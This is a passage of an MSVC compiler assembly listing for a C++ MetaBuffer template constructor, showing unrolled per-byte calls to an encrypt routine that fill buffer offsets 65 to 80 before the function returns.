  00ac9	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00ace	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00ad5	88 41 41	 mov	 BYTE PTR [rcx+65], al
  00ad8	b8 01 00 00 00	 mov	 eax, 1
  00add	48 6b c0 41	 imul	 rax, rax, 65		; 00000041H
  00ae1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00ae8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00aec	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00af3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00af8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00aff	88 41 42	 mov	 BYTE PTR [rcx+66], al
  00b02	b8 01 00 00 00	 mov	 eax, 1
  00b07	48 6b c0 42	 imul	 rax, rax, 66		; 00000042H
  00b0b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00b12	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00b16	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00b1d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00b22	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00b29	88 41 43	 mov	 BYTE PTR [rcx+67], al
  00b2c	b8 01 00 00 00	 mov	 eax, 1
  00b31	48 6b c0 43	 imul	 rax, rax, 67		; 00000043H
  00b35	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00b3c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00b40	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00b47	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00b4c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00b53	88 41 44	 mov	 BYTE PTR [rcx+68], al
  00b56	b8 01 00 00 00	 mov	 eax, 1
  00b5b	48 6b c0 44	 imul	 rax, rax, 68		; 00000044H
  00b5f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00b66	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00b6a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00b71	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00b76	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00b7d	88 41 45	 mov	 BYTE PTR [rcx+69], al
  00b80	b8 01 00 00 00	 mov	 eax, 1
  00b85	48 6b c0 45	 imul	 rax, rax, 69		; 00000045H
  00b89	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00b90	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00b94	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00b9b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00ba0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00ba7	88 41 46	 mov	 BYTE PTR [rcx+70], al
  00baa	b8 01 00 00 00	 mov	 eax, 1
  00baf	48 6b c0 46	 imul	 rax, rax, 70		; 00000046H
  00bb3	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00bba	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00bbe	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00bc5	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00bca	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00bd1	88 41 47	 mov	 BYTE PTR [rcx+71], al
  00bd4	b8 01 00 00 00	 mov	 eax, 1
  00bd9	48 6b c0 47	 imul	 rax, rax, 71		; 00000047H
  00bdd	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00be4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00be8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00bef	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00bf4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00bfb	88 41 48	 mov	 BYTE PTR [rcx+72], al
  00bfe	b8 01 00 00 00	 mov	 eax, 1
  00c03	48 6b c0 48	 imul	 rax, rax, 72		; 00000048H
  00c07	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00c0e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00c12	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00c19	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00c1e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00c25	88 41 49	 mov	 BYTE PTR [rcx+73], al
  00c28	b8 01 00 00 00	 mov	 eax, 1
  00c2d	48 6b c0 49	 imul	 rax, rax, 73		; 00000049H
  00c31	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00c38	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00c3c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00c43	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00c48	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00c4f	88 41 4a	 mov	 BYTE PTR [rcx+74], al
  00c52	b8 01 00 00 00	 mov	 eax, 1
  00c57	48 6b c0 4a	 imul	 rax, rax, 74		; 0000004aH
  00c5b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00c62	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00c66	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00c6d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00c72	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00c79	88 41 4b	 mov	 BYTE PTR [rcx+75], al
  00c7c	b8 01 00 00 00	 mov	 eax, 1
  00c81	48 6b c0 4b	 imul	 rax, rax, 75		; 0000004bH
  00c85	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00c8c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00c90	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00c97	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00c9c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00ca3	88 41 4c	 mov	 BYTE PTR [rcx+76], al
  00ca6	b8 01 00 00 00	 mov	 eax, 1
  00cab	48 6b c0 4c	 imul	 rax, rax, 76		; 0000004cH
  00caf	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00cb6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00cba	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00cc1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00cc6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00ccd	88 41 4d	 mov	 BYTE PTR [rcx+77], al
  00cd0	b8 01 00 00 00	 mov	 eax, 1
  00cd5	48 6b c0 4d	 imul	 rax, rax, 77		; 0000004dH
  00cd9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00ce0	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00ce4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00ceb	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00cf0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00cf7	88 41 4e	 mov	 BYTE PTR [rcx+78], al
  00cfa	b8 01 00 00 00	 mov	 eax, 1
  00cff	48 6b c0 4e	 imul	 rax, rax, 78		; 0000004eH
  00d03	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00d0a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00d0e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00d15	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00d1a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00d21	88 41 4f	 mov	 BYTE PTR [rcx+79], al
  00d24	b8 01 00 00 00	 mov	 eax, 1
  00d29	48 6b c0 4f	 imul	 rax, rax, 79		; 0000004fH
  00d2d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00d34	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00d38	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00d3f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0FJ@$0EO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@AEBAEE@Z ; MetaBuffer<89,78,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::encrypt
  00d44	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00d4b	88 41 50	 mov	 BYTE PTR [rcx+80], al
  00d4e	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00d55	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  00d59	88 85 c0 00 00
	00		 mov	 BYTE PTR tv658[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  00d5f	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00d66	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  00d6d	5f		 pop	 rdi
  00d6e	5d		 pop	 rbp
  00d6f	c3		 ret	 0
